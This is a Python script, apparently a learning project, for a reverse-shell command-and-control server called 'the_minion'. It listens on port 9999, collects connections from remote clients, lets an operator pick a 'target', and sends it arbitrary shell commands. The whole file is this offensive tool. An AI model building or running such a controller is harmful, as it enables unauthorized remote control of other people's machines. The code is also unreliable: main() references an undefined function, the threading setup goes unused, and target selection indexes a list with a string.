import socket
import sys 
import threading          # this library will be used for multi threading
import time 
from queue import Queue 


Number_of_threads = 2                # as we will have to perform only two things so we dont need more than 2 threads 
Job_number = [1,2]                   #  1 - is the first thread resposible for listen and accept the connection, 2 - is the second thread and responsible for sending commands to the clients and maintaing the connection with existing clients
queue = Queue()
all_connections = list()
all_address = list()


def socket_creation():
    global host
    global port
    global s

    host=""
    port = 9999

    try:
        s = socket.socket()
    except socket.error as msg:
        print("Socket Creation failed "+msg)


def binding():
    try:
        global host
        global port 
        global s 

        print("binding the port")
        s.bind((host,port))

        s.listen(5)             

    except socket.error as msg:
        print("Socket Binding error "+msg)

"""while handling multiple clients the process of creating the socket and binding will be the same 
but the way we are going to accept connections and send commands is going to be different."""

def accepting_responses():
    
    for conn in all_connections:
        conn.close()

    del all_connections[:]
    del all_address[:]

    while True:

        try :
            connections, address = s.accept()
            s.setblocking(1)      # prevents the connections from begin time out

            all_connections.append(connections)
            all_address.append(address)

            print("Connection have been successfully established with the address: "+address[0] + "binded to the port: " + str(address[1]))
        except socket.error as msg:
            print("Error occured during the accepting the requests from the client: "+msg)


# 2nd thread function : 1. see all the clients 2. select a client and 3. send commands to the client remotely 
# we will be building an interactive command prompt for snding commands / creating a custom creative shell 
            
# we will be naming out shell: the_minion 
# the_minion > list         - will show the following list of connections
# 1 client-1 
# 2 client-2 
# 3 client-3 ..... and so on
            

def strt_the_minion():
    while True:
        cmd = input('the_minion > ')

        if cmd == "list":
            list_connections()

        elif "select" in cmd :
            conn = get_target(cmd)

            if conn is not None:
                send_target_command(conn)

        else:
            print("Command not recognised")


# display all current active connections with the client
        
def list_connections():
    results = ''

    for key, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[key]
            del all_address[key]
            continue

        results = str(key) + "  " + str(all_address[key][0] + "  " + str(all_address[key][1])+ "\n")
    print("------Clients------" + '\n' + results)


# selecting a particular target
def get_target(cmd):
    try:
        _,target = cmd.split(" ")

        conn = all_connections[int(target)]
        print("Your are now connected to : "+ all_address[target][0])
        print(f"{all_address[target][0]} >", end = "")
        return conn


    except:
        print("Selection not valid")
        return None
    

def send_target_command(connect):
    try:
        while True:                           # help us make it persistant and to be able to execute multiple commands b4 closing the connection
            cmd = input("Enter the command to execute else quit to exit: ")
            if cmd == 'quit':
                connect.close()
                s.close()
                sys.exit()
            if len(str.encode(cmd)) > 0 :
                connect.send(str.encode(cmd))
                client_response  = str(connect.recv(201480),'utf-8')
                print(client_response, end="")

    except:
        print("Error sending commands")




def main():
    socket_creation()
    binding()
    socket_accept


if __name__=="__main__":
    main()
